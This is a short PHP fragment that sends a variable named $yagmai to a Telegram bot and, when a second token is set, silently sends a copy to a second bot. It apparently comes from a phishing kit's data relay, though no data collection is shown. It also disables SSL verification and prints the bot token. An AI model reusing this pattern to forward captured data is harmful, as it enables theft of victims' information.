<?php 


    




  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$yagmai,
      'reply_markup' => $keyboard
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  echo "".$botToken."" ;
  if ($botToken_0 == "off") {

  } else {
    $websitee="https://api.telegram.org/bot".$botToken_0;
  $paramss=[
      'chat_id'=>$chatId_0,
      'text'=>$yagmai,
  ];
  $chh = curl_init($websitee . '/sendMessage');
  curl_setopt($chh, CURLOPT_HEADER, false);
  curl_setopt($chh, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($chh, CURLOPT_POST, 1);
  curl_setopt($chh, CURLOPT_POSTFIELDS, ($paramss));
  curl_setopt($chh, CURLOPT_SSL_VERIFYPEER, false);
  $resultt = curl_exec($chh);
  curl_close($chh);
  }
  ?>